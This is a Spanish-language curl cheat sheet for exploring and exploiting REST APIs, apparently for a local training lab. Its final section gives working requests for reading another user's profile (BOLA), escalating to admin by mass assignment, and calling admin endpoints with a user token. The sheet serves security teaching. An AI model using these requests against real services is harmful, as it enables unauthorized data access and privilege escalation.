# Cheat Sheet — curl para API Security

Comandos esenciales para explorar y explotar APIs REST.

---

## Autenticacion con Bearer Token

```bash
curl -H "Authorization: Bearer TOKEN" http://host/api/endpoint
```

## Enviar JSON (POST / PUT)

```bash
curl -X POST http://host/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"key":"value"}'
```

## Ver headers de respuesta

```bash
curl -I http://host/api/endpoint
curl -v http://host/api/endpoint
```

## Ignorar certificado TLS

```bash
curl -k https://host/api/endpoint
```

## Guardar output en archivo

```bash
curl -s http://host/api/endpoint -o respuesta.json
```

## Flujo completo: login y usar token

```bash
# Login y extraer token
TOKEN=$(curl -s -X POST http://localhost:8025/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

# Usar el token
curl -s http://localhost:8025/api/users/1/profile \
  -H "Authorization: Bearer $TOKEN"
```

## Comandos especificos para la API del lab

```bash
# Health check
curl http://localhost:8025/api/health

# Login como alice
curl -s -X POST http://localhost:8025/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"alice123"}'

# BOLA: leer perfil ajeno (alice accede a bob=2)
curl -s http://localhost:8025/api/users/2/profile \
  -H "Authorization: Bearer token_alice"

# Mass Assignment: escalar rol
curl -s -X PUT http://localhost:8025/api/users/1/profile \
  -H "Authorization: Bearer token_alice" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}'

# Broken Function Auth: admin endpoint con token de user
curl -s http://localhost:8025/api/admin/users \
  -H "Authorization: Bearer token_alice"
```
